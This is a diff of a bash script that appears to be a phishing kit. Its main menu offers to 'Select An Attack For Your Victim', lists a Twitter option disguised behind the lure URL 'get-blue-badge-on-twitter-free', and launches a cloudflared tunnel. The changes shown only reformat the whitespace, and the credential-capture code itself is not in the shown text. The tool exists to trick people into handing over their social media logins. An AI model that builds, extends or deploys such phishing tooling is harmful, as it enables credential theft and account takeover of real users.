@@ -256,7 +256,8 @@ tunnel_selection() {
 ## Menu
 main_menu() {
 	{ clear; banner; echo; }
-	cat <<- EOF
+	
+  cat <<- EOF
           ${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
           ${RED}[${WHITE}08${RED}]${ORANGE} Twitter
@@ -268,20 +269,21 @@ main_menu() {
   read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"  
 
   case $REPLY in 
-		 1 | 01)
-		         website="Twitter"
-                         mask='http://get-blue-badge-on-twitter-free'
-                         tunnel_menu;;
+	  1 | 01)
+		  website="Twitter"
+                  mask='http://get-blue-badge-on-twitter-free'
+                  tunnel_menu;;
    
-                 99)
-			about;;
-		0 | 00 )
-			msg_exit;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; main_menu; };;
+              99)
+		  about;;
+	      0 | 00 )
+		  msg_exit;;
+	      *)
+	          echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+		  { sleep 1; main_menu; };;
 	
-	esac
+  esac
+
 }
 
 # Main
@@ -289,4 +291,3 @@ kill_pid
 dependenc
 install_cloudflared
 main_menu
-                 
